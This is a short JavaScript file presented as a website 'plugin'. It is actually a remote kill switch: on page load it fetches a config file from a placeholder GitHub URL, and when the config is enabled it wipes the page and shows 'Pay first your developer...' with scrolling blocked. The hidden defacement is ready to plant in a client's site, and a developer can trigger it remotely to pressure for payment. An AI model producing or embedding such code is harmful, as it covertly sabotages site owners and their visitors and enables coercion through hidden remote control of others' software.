(function() {
    // Fetch configuration from GitHub
    function fetchConfig(callback) {
        const configUrl = 'https://raw.githubusercontent.com/[YOUR_USERNAME]/[REPO_NAME]/main/config.json';
        // Cache busting to get fresh config
        fetch(configUrl + '?t=' + Date.now())
            .then(response => response.json())
            .then(config => callback(config))
            .catch(error => console.error('Plugin config error:', error));
    }

    // Main plugin function
    function runPlugin() {
        fetchConfig(function(config) {
            if (config.enabled) {
                // Replace body content
                document.body.innerHTML = '<h1 style="padding: 50px; text-align: center;">Pay first your developer...</h1>';
                // Optional: Prevent scrolling
                document.body.style.overflow = 'hidden';
            }
        });
    }

    // Run when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', runPlugin);
    } else {
        runPlugin();
    }
})();
